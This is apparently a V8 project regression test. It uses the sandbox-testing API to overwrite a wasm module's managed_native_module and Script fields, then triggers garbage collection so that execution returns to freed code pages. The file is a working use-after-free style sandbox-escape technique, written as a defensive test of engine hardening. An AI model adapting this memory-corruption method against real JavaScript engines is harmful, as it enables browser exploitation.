// Copyright 2024 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax --sandbox-testing --expose-gc

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// Helpers and constants.
const kHeapObjectTag = 1;
const kWasmInstanceObjectType = Sandbox.getInstanceTypeIdFor('WASM_INSTANCE_OBJECT_TYPE');
const kWasmModuleObjectType = Sandbox.getInstanceTypeIdFor('WASM_MODULE_OBJECT_TYPE');
const kScriptType = Sandbox.getInstanceTypeIdFor('SCRIPT_TYPE');
const kWasmInstanceObjectModuleOffset = Sandbox.getFieldOffset(kWasmInstanceObjectType, 'module_object');
const kWasmModuleObjectManagedNativeModuleOffset = Sandbox.getFieldOffset(kWasmModuleObjectType, 'managed_native_module');
const kWasmModuleObjectScriptOffset = Sandbox.getFieldOffset(kWasmModuleObjectType, 'script');
const kScriptWasmManagedNativeModuleOffset = Sandbox.getFieldOffset(kScriptType, 'wasm_managed_native_module');

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

// End of helpers and constants.

function manipulate_instance() {
  // Update instance1->module to point to instance2->module.

  const inst1_addr = getPtr(instance1);
  const inst2_addr = getPtr(instance2);

  // Find module1 and module2.
  const module1_addr = getField(inst1_addr, kWasmInstanceObjectModuleOffset);
  const module2_addr = getField(inst2_addr, kWasmInstanceObjectModuleOffset);

  // Manipulate module1->managed_native_module to point to
  // module2->managed_native_module.
  const managed_native_module_2 =
      getField(module2_addr, kWasmModuleObjectManagedNativeModuleOffset);
  setField(
      module1_addr, kWasmModuleObjectManagedNativeModuleOffset,
      managed_native_module_2);

  // Find both Scripts.
  const script1_addr = getField(module1_addr, kWasmModuleObjectScriptOffset);
  const script2_addr = getField(module2_addr, kWasmModuleObjectScriptOffset);

  // Manipulate script1->managed_native_module to point to
  // script2->managed_native_module.
  assertEquals(
      managed_native_module_2,
      getField(script2_addr, kScriptWasmManagedNativeModuleOffset));
  setField(
      script1_addr, kScriptWasmManagedNativeModuleOffset, managed_native_module_2);

  // Trigger GCs such that module1 is garbage-collected.
  print('Triggering GCs....');
  gc();
  print('Manipulation done.');
  // If nothing else held the NativeModule alive we are now returning to
  // deallocated code pages.
}

const builder = new WasmModuleBuilder();
const imp_idx = builder.addImport('imp', 'f', kSig_v_v);
builder.addFunction('call_import', kSig_v_v).exportFunc().addBody([
  kExprCallFunction, imp_idx
]);

const instance1 = builder.instantiate({imp: {f: manipulate_instance}});
builder.addGlobal(kWasmI32, true, false);  // unused.
const instance2 = builder.instantiate({imp: {f: manipulate_instance}});

instance1.exports.call_import();
